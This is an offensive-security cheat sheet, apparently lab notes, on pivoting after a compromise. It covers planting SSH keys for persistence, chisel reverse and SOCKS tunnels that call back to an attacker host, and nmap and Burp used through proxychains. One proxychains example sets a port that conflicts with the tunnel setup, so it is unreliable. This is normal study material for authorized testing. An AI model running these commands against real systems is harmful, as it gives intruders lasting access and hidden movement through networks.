# Pivoting 

## Readme

https://cheatsheet.haax.fr/network/pivot_techniques/
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html

## Persist

It is important to establish persistence before moving forward with actions on objectives.

### Linux

#### private ssh key

1. copy roots private key: copy-paste in vim is enough

`vim root_key`

2. login via ssh using the key

`ssh -i root_key root@VICTIM_IP`

#### inject your own public key into authorized hosts

```bash
cat id_ed25519.pub >> authorized_keys

# root or any other user
ssh -l root VICTIM_IP
```

##  Proxies

### Forward proxy

some service is listening at victim and connection is incomming from atacker 


### static  forwarding


 <local-interface>:<local-port>:<remote-host>:<remote-port>

  which does  port forwarding, sharing 
  
   
clients <local-interface>:<local-port>
on remote server's <remote-host>:<remote-port>

Set up new server (this time non socks) on attacker

./chisel server --port 9902

Activate client on victims host

./chisel client 10.10.14.xxx:9902 192.168.1.15:8888:127.0.0.1:443 

So now attacker can access victims port external 8888 on it localhost port 443

### Reverse proxy

some service is listening at attacker AND connection is incomming from the victim outside firewall



#### static reverse

Attacker (1.1.1.1:8000) --------> Victim Pivot (client forwards input from attacker to next victim ) --------> Next Victim (3.3.3.4)

./chisel server -p 9903 --reverse on local 
./chisel client 10.10.xx.xx:9903 R:127.0.0.1:1280:172.16.xx.xx:80 &

This will open a listener on port 1280 on attackers localhost, and all connections to the target website on 172.16.xx.xx are going to be forwarded via pivot server at 10.10.xx.xx:9903

#### Dynamic reverse forwarding

* In this scenario all ports from the victim pivot point aer redirected to attacker so attacker can access Next Victim, which
would be othervise not visible for his network adapter

./chisel server -p 3333 --reverse --socks5

./chisel_lin client 172.16.40.5:3333 R:7777:socks

sudo vim /etc/proxychains4.conf

socks5 127.0.0.1 3333

proxychains nmap -F 10.185.10.0/24


## Configuration for Burp

It can be tricky to use burp with socks but here is a good workaround

1. Setting -> Network -> Connections -> SOCKS proxy 
2. check> Use SOCKS proxy
3. `127.0.0.1 sock_port`
4. in browser selects burps normal proxy `default is 127.0.0.1 8080`
5. no when you browse: attacker -> burp proxy -> socks proxy -> victim
6. Profit!


## scanning with nmap

* run for getting open ports
`seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.42.42.2 -oG 10.42.42.2 --open --append-output 10.42.42.2 -Pn -n`

* remove bad lines and save to log file
`grep '/open/' 10.42.42.2 | uniq > openports.log`

* then scan each port separately
